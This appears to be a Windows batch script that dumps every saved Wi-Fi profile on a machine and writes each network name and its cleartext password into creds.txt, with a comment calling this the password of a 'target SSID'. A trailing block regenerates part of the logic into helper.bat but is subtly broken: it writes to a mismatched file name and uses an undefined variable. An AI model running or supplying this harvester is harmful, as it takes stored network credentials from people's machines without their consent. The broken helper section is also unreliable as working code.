netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]" > temp.txt
type temp.txt

setlocal enabledelayedexpansion
for /f "tokens=5*" %%i in (temp.txt) do ( set val=%%i %%j
if "!val:~-1!" == " " set val=!val:~0, -1!
echo !val! >> final.txt)
for /f "tokens=*" %%i in (final.txt) do @echo SSID: %%i >> creds.txt & echo # >> creds.txt & netsh wlan show profiles name=%%i key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 >> creds.txt & echo # >> creds.txt & echo # Key content is the password of your target SSID. >> creds.txt & echo # >> creds.txt
del /q temp.txt final.txt
exit

echo setlocal enabledelayedexpansion >> helper.bat
echo for /f "tokens=5*" %%%%i in (temp.txt) do ( set val=%%%%i %%%%j >> helper.bat
echo if "!val:~-1!" == " " set val=!val:~0, -1! >> helper.bat
echo echo !val! ^>^> final.txt) >> helper.bat
echo for /f "tokens=*" %%%%i in (final.txt) do @echo SSID:%%%%i ^>^> creds.txt ^& echo # %tempdivider% ^>^> cred.txt >> helper.bat
echo del /q temp.txt final.txt >> helper.bat
echo exit >> helper.bat
